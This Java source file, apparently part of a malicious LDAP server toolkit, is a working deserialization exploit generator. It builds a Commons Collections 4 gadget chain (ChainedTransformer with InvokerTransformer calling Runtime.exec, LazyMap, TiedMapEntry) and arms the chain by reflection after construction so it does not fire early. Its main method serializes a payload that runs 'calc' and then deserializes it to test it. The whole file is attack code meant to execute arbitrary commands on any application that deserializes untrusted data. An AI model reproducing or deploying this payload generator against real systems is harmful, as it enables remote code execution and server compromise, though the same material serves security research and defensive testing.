package com.mickhu.ldap.gadgets;

import com.mickhu.ldap.enumtypes.PayloadType;
import com.mickhu.ldap.gadgets.utils.Gadgets;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;
import org.apache.commons.collections4.keyvalue.TiedMapEntry;
import org.apache.commons.collections4.map.LazyMap;

import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;

/**
 * @ mickhuu
 * @ 2022/9/1 : 10:25
 */
public class CommonsCollectionsK4 {
    public static void main(String[] args) throws Exception {
        byte[] bytes = getBytes(PayloadType.command, "calc");
        FileOutputStream fous = new FileOutputStream("out444.ser");
        fous.write(bytes);
        fous.close();
        ObjectInputStream objectInputStream =new ObjectInputStream(new FileInputStream("out444.ser"));
        System.out.println(objectInputStream.readObject());
    }

    public static byte[] getBytes(PayloadType type, String... param) throws Exception {
        Object tpl = Gadgets.createTemplatesImpl(type, param);
        final Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{
                        String.class, Class[].class}, new Object[]{
                        "getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[]{
                        Object.class, Object[].class}, new Object[]{
                        null, new Object[0]}),
                new InvokerTransformer("exec",
                        new Class[]{String.class}, param),
                new ConstantTransformer(new HashSet<String>())};
        ChainedTransformer inertChain = new ChainedTransformer(new Transformer[]{});

        HashMap<String,String> innerMap = new HashMap<String, String>();
        Map m = LazyMap.lazyMap(innerMap, inertChain);

        Map outerMap = new HashMap();
        TiedMapEntry tied = new TiedMapEntry(m, tpl);
        outerMap.put(tied, "t");
        // 这个很关键
        innerMap.clear();

        // 将真正的 transformers 设置, 避免上面 put 时 payload 时就执行了
        Field field = inertChain.getClass().getDeclaredField("iTransformers");
        field.setAccessible(true);
        field.set(inertChain, transformers);

        //序列化
        ByteArrayOutputStream baous = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baous);
        oos.writeObject(outerMap);
        byte[] bytes = baous.toByteArray();
        oos.close();

        return bytes;
    }
}
